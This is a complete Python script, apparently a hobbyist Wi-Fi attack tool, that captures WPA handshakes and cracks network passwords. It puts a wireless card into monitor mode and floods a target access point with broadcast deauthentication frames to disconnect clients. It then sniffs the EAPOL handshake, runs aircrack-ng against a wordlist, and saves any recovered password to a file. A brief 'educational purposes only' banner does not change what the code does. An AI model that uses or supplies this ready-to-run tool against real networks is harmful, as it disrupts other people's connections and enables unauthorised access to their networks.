#!/usr/bin/env python3

import argparse
import os
import sys
import time
import subprocess
import threading
from datetime import datetime
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff, wrpcap, rdpcap, EAPOL

# ANSI color codes for terminal output
COLORS = {
    'GREEN': '\033[92m',
    'YELLOW': '\033[93m',
    'RED': '\033[91m',
    'BLUE': '\033[94m',
    'ENDC': '\033[0m',
    'BOLD': '\033[1m'
}

def print_banner():
    """Display a stylish banner for the tool."""
    banner = """

 __      __.__  _____.__ _________                      __                
/  \    /  \__|/ ____\__|\_   ___ \____________ ____ |  | __ ___________ 
\   \/\/   /  \   __\|  |/    \  \/\_  __ \__  \\_  \|  |/ // __ \_  __ \\
 \        /|  ||  |  |  |\     \____|  | \// __ \|  \ |    <\  ___/|  | \/
  \__/\  / |__||__|  |__| \______  /|__|  (____  /__/ |__|_ \\___  >__|   
       \/                        \/            \/          \/    \/       
                                         
    """
    
    print("\033[1;94m" + banner + "\033[0m")  
    print("\033[1;32m" + "  Original by: Sambhav Mehra" + "\033[0m") 
    print("\033[1;32m" + "  Follow on Instagram: sambhav@7" + "\033[0m")  
    print("\033[1;33m" + "  WiFi Handshake Capture and Password Cracking Tool" + "\033[0m")  
    print("\033[1;31m" + "\n  [!] Use for educational purposes only. Be ethical.\n" + "\033[0m")  


def log(message, level='info'):
    """Log messages with colors based on level."""
    timestamp = datetime.now().strftime("%H:%M:%S")
    if level == 'info':
        print(f"[{timestamp}] [*] {message}")
    elif level == 'success':
        print(f"[{timestamp}] {COLORS['GREEN']}[+] {message}{COLORS['ENDC']}")
    elif level == 'error':
        print(f"[{timestamp}] {COLORS['RED']}[-] {message}{COLORS['ENDC']}")
    elif level == 'warning':
        print(f"[{timestamp}] {COLORS['YELLOW']}[!] {message}{COLORS['ENDC']}")

def check_dependencies():
    """Check if required dependencies are installed."""
    dependencies = ['aircrack-ng']
    missing = []
    
    for dep in dependencies:
        try:
            subprocess.check_output(['which', dep], stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError:
            missing.append(dep)
    
    if missing:
        log(f"Missing dependencies: {', '.join(missing)}", 'error')
        log("Please install required dependencies:", 'info')
        if 'aircrack-ng' in missing:
            log("  sudo apt-get install aircrack-ng", 'info')
        sys.exit(1)

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description='Capture Wi-Fi handshakes and crack passwords')
    
    # Mode selection
    mode_group = parser.add_argument_group('Mode Selection')
    mode_group.add_argument('--mode', choices=['capture', 'crack', 'both'], default='both',
                          help='Tool mode: capture handshake, crack password, or both (default: both)')
    
    # Capture options
    capture_group = parser.add_argument_group('Handshake Capture Options')
    capture_group.add_argument('-i', '--interface', help='Wireless interface to use for capturing')
    capture_group.add_argument('-c', '--channel', type=int, help='Wi-Fi channel to monitor')
    capture_group.add_argument('-b', '--bssid', help='Target BSSID (AP MAC address)')
    capture_group.add_argument('-e', '--essid', help='Target ESSID (AP name)')
    capture_group.add_argument('-o', '--output', help='Output capture file')
    capture_group.add_argument('-t', '--timeout', type=int, default=300, help='Capture timeout in seconds (default: 300)')
    capture_group.add_argument('--deauth', action='store_true', help='Send deauthentication packets to force handshake')
    
    # Cracking options
    crack_group = parser.add_argument_group('Password Cracking Options')
    crack_group.add_argument('-w', '--wordlist', help='Path to wordlist file for cracking')
    crack_group.add_argument('-f', '--capture-file', help='Capture file to crack (if not capturing)')
    
    args = parser.parse_args()
    
    # Validation
    if args.mode in ['capture', 'both'] and not args.interface:
        parser.error("Capture mode requires --interface")
    
    if args.mode in ['crack', 'both'] and not args.wordlist:
        parser.error("Cracking mode requires --wordlist")
    
    if args.mode == 'crack' and not args.capture_file:
        parser.error("Cracking mode requires --capture-file when not capturing")
        
    return args

def set_monitor_mode(interface):
    """Put the wireless interface into monitor mode."""
    log(f"Setting {interface} to monitor mode...")
    
    try:
        os.system(f"sudo ifconfig {interface} down")
        os.system(f"sudo iwconfig {interface} mode monitor")
        os.system(f"sudo ifconfig {interface} up")
        log(f"Interface {interface} is now in monitor mode", 'success')
        return True
    except Exception as e:
        log(f"Failed to set monitor mode: {str(e)}", 'error')
        return False

def set_channel(interface, channel):
    """Set the wireless interface to a specific channel."""
    if channel:
        log(f"Setting {interface} to channel {channel}...")
        try:
            os.system(f"sudo iwconfig {interface} channel {channel}")
            log(f"Interface {interface} is now on channel {channel}", 'success')
            return True
        except Exception as e:
            log(f"Failed to set channel: {str(e)}", 'error')
            return False
    return True

def send_deauth(interface, bssid, client_mac=None, count=5):
    """Send deauthentication packets to force handshake."""
    log(f"Sending deauthentication packets to {bssid}...", 'warning')
    
    # If no client MAC is specified, use broadcast
    if not client_mac:
        client_mac = "FF:FF:FF:FF:FF:FF"
    
    # Create deauth packet
    packet = RadioTap() / Dot11(
        type=0, 
        subtype=12, 
        addr1=client_mac,
        addr2=bssid, 
        addr3=bssid
    ) / Dot11Deauth(reason=7)
    
    for _ in range(count):
        sendp(packet, iface=interface, count=10, verbose=False)
        time.sleep(0.5)
    
    log("Deauthentication packets sent", 'success')

def deauth_thread(interface, bssid, duration=60):
    """Thread to continuously send deauthentication packets."""
    end_time = time.time() + duration
    while time.time() < end_time:
        send_deauth(interface, bssid)
        time.sleep(5)

def is_eapol(packet):
    """Check if the packet is an EAPOL packet (part of the handshake)."""
    return packet.haslayer(EAPOL)

def has_handshake(capture_file, bssid=None):
    """Check if the capture file contains a complete handshake."""
    try:
        # Use aircrack-ng to verify the handshake (more reliable than manual checking)
        command = ['aircrack-ng', capture_file]
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, universal_newlines=True)
        
        if "handshake" in output.lower():
            return True
        
        # Backup manual check using Scapy
        packets = rdpcap(capture_file)
        eapol_packets = [p for p in packets if is_eapol(p)]
        
        if len(eapol_packets) < 4:
            return False
        
        # Check for message types (1-4) in the handshake
        message_types = set()
        for p in eapol_packets:
            if bssid and (p.addr1 != bssid and p.addr2 != bssid and p.addr3 != bssid):
                continue
            # Extract message type from EAPOL packet
            if p.haslayer(EAPOL):
                message_type = p[EAPOL].type
                if message_type in range(1, 5):
                    message_types.add(message_type)
        
        return len(message_types) >= 4
    except Exception as e:
        log(f"Error checking handshake: {str(e)}", 'error')
        return False

def capture_handshake(interface, output_file, bssid=None, essid=None, channel=None, timeout=300, send_deauths=False):
    """Capture Wi-Fi handshake packets."""
    log(f"Starting capture on {interface}...")
    log(f"Saving to {output_file}")
    log(f"Timeout: {timeout} seconds")
    
    if bssid:
        log(f"Target BSSID: {bssid}")
    if essid:
        log(f"Target ESSID: {essid}")
    
    # Start deauth thread if requested
    if send_deauths and bssid:
        log("Deauthentication mode enabled", 'warning')
        deauth_t = threading.Thread(target=deauth_thread, args=(interface, bssid, timeout))
        deauth_t.daemon = True
        deauth_t.start()
    
    # Use Scapy's sniff function with a filter for EAPOL packets
    handshake_found = False
    start_time = time.time()
    packets = []
    
    try:
        while time.time() - start_time < timeout and not handshake_found:
            # Capture in small chunks to regularly check for handshakes
            new_packets = sniff(iface=interface, count=100, timeout=5)
            packets.extend(new_packets)
            
            # Write temporary file to check for handshake
            wrpcap(output_file, packets)
            
            # Count EAPOL packets
            eapol_count = sum(1 for p in packets if is_eapol(p))
            
            # Update status
            current_time = time.time() - start_time
            elapsed = f"{int(current_time // 60):02d}:{int(current_time % 60):02d}"
            print(f"\r[{elapsed}] EAPOL packets: {eapol_count} | Total packets: {len(packets)}  ", end="")
            
            # Check if we have a handshake
            if eapol_count >= 4:
                if has_handshake(output_file, bssid):
                    handshake_found = True
                    print("")  # New line after the progress indicator
                    log("Complete handshake captured!", 'success')
                
    except KeyboardInterrupt:
        print("")  # New line after the progress indicator
        log("Capture stopped by user", 'warning')
    
    # Final save
    wrpcap(output_file, packets)
    
    if handshake_found:
        log(f"Handshake successfully saved to {output_file}", 'success')
    else:
        log(f"No complete handshake found. Partial capture saved to {output_file}", 'warning')
    
    return handshake_found, output_file

def crack_password(capture_file, wordlist, bssid=None, essid=None):
    """Crack Wi-Fi password using captured handshake."""
    if not os.path.exists(capture_file):
        log(f"Capture file {capture_file} not found", 'error')
        return False, None
    
    if not os.path.exists(wordlist):
        log(f"Wordlist {wordlist} not found", 'error')
        return False, None
    
    log(f"Cracking password using {wordlist}...")
    log(f"This may take a while depending on wordlist size")
    
    # Prepare aircrack-ng command
    command = ['aircrack-ng', capture_file, '-w', wordlist]
    if bssid:
        command.extend(['-b', bssid])
    
    try:
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
            bufsize=1
        )
        
        password_found = False
        key = None
        
        for line in process.stdout:
            line = line.strip()
            print(line)
            
            # Check for successful key finding
            if "KEY FOUND!" in line:
                password_found = True
            
            # Extract the password
            if password_found and "KEY FOUND! [ " in line:
                key = line.split("KEY FOUND! [ ")[1].split(" ]")[0]
                break
        
        process.wait()
        
        if password_found and key:
            log(f"Password found: {key}", 'success')
            return True, key
        else:
            log("Password not found in the provided wordlist", 'error')
            return False, None
            
    except Exception as e:
        log(f"Error during password cracking: {str(e)}", 'error')
        return False, None

def restore_network(interface):
    """Restore wireless interface to managed mode."""
    log("Restoring network interface to managed mode...")
    try:
        os.system(f"sudo ifconfig {interface} down")
        os.system(f"sudo iwconfig {interface} mode managed")
        os.system(f"sudo ifconfig {interface} up")
        log("Network interface restored", 'success')
    except Exception as e:
        log(f"Error restoring network: {str(e)}", 'error')

def main():
    print_banner()
    
    # Check if running with admin privileges (cross-platform)
    if os.name == 'nt':  # Windows
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            log("This script must be run as administrator on Windows!", 'error')
            return 1
    else:  # Unix-like (Linux, macOS)
        if os.geteuid() != 0:
            log("This script must be run as root on Unix-like systems!", 'error')
            return 1
    
    # Check for required dependencies
    check_dependencies()
    
    # Parse arguments
    args = parse_arguments()
    
    # Generate output filename if not specified
    if args.mode in ['capture', 'both'] and not args.output:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        bssid_str = args.bssid.replace(':', '') if args.bssid else 'any'
        args.output = f"handshake_{bssid_str}_{timestamp}.cap"
    
    # Mode: Capture or Both
    if args.mode in ['capture', 'both']:
        # Configure interface
        if os.name == 'nt':  # Windows
            # Windows-specific interface setup
            log("Setting up wireless interface for Windows...", 'info')
            # For Windows, we would use a different approach with NetMon or similar
            # This is a simplified placeholder - would need more detailed implementation
            windows_monitor_mode_success = True  # Placeholder for actual implementation
            if not windows_monitor_mode_success:
                log("Failed to set up monitoring on Windows", 'error')
                return 1
        else:  # Unix-like
            if not set_monitor_mode(args.interface):
                return 1
            
            if not set_channel(args.interface, args.channel):
                restore_network(args.interface)
                return 1
        
        # Start capture
        handshake_found, capture_file = capture_handshake(
            args.interface, 
            args.output, 
            args.bssid, 
            args.essid, 
            args.channel, 
            args.timeout,
            args.deauth
        )
        
        # Restore interface
        if os.name != 'nt':  # Only for Unix-like
            restore_network(args.interface)
        
        # If not found and in capture-only mode, exit
        if not handshake_found and args.mode == 'capture':
            return 0
    else:
        # In crack-only mode, use the provided capture file
        capture_file = args.capture_file
    
    # Mode: Crack or Both
    if args.mode in ['crack', 'both']:
        if args.mode == 'both' and not handshake_found:
            log("No handshake captured, skipping password cracking", 'warning')
        else:
            success, password = crack_password(capture_file, args.wordlist, args.bssid, args.essid)
            
            if success:
                # Save password to file
                with open(f"{os.path.splitext(capture_file)[0]}_password.txt", 'w') as f:
                    f.write(f"BSSID: {args.bssid if args.bssid else 'Unknown'}\n")
                    f.write(f"ESSID: {args.essid if args.essid else 'Unknown'}\n")
                    f.write(f"Password: {password}\n")
                    f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                
                log(f"Password saved to {os.path.splitext(capture_file)[0]}_password.txt", 'success')
    
    log("All operations completed", 'success')
    return 0

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n")
        log("Program interrupted by user", 'warning')
        sys.exit(1)
    except Exception as e:
        log(f"Unexpected error: {str(e)}", 'error')
        sys.exit(1)